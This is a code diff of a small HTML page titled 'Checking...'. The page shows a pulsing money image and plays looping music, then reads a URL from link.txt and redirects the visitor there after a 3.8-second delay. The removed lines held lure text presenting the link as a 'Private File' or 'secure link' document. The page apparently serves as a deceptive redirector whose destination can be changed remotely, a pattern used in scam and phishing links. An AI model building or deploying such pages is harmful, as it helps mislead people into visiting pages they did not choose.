@@ -3,24 +3,48 @@
 <head>
     <meta charset="UTF-8">
     <title>Checking...</title>
-    <meta property="og:title" content="Private File">
-    <meta property="og:image" content="money.jpg">
-    <meta property="og:description" content="Click to view the document">
+    <style>
+        /* 背景全黑，确保照片始终居中显示 */
+        body { margin: 0; background: #000; overflow: hidden; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        
+        /* 呼吸动画：让照片每 3 秒缓缓放大缩小一次 */
+        .zoom-img {
+            width: 100%;
+            height: auto;
+            max-width: 600px; /* 限制最大宽度，防止大屏上变形 */
+            animation: breath 3s ease-in-out infinite;
+        }
+        @keyframes breath {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.08); }
+            100% { transform: scale(1); }
+        }
+    </style>
 </head>
 <body>
-    <img src="money.jpg" style="width:100%; height:auto;">
-    <p style="text-align:center; color:#666;">Loading secure link...</p>
+    <img src="money.jpg" class="zoom-img">
+    
+    <audio id="bgMusic" src="8.mp3" loop autoplay></audio>
 
     <script>
-        // 这里的逻辑：去读同文件夹下的 link.txt
+        // 手机浏览器安全策略：用户点一下屏幕就开始播音乐
+        document.addEventListener('click', function() {
+            var audio = document.getElementById('bgMusic');
+            audio.play().catch(e => console.log("等待交互播放"));
+        }, { once: true });
+
+        // 自动读取 link.txt 并跳转
         fetch('link.txt?t=' + new Date().getTime())
             .then(response => response.text())
             .then(url => {
-                if (url && url.includes('http')) {
-                    window.location.replace(url.trim());
-                }
+                // 设置 3.8 秒延迟，给足时间展示照片动画和播放音乐
+                setTimeout(() => {
+                    if (url && url.includes('http')) {
+                        window.location.replace(url.trim());
+                    }
+                }, 3800); 
             })
-            .catch(err => console.error("读取链接失败"));
+            .catch(err => console.error("Link reading error"));
     </script>
 </body>
 </html>
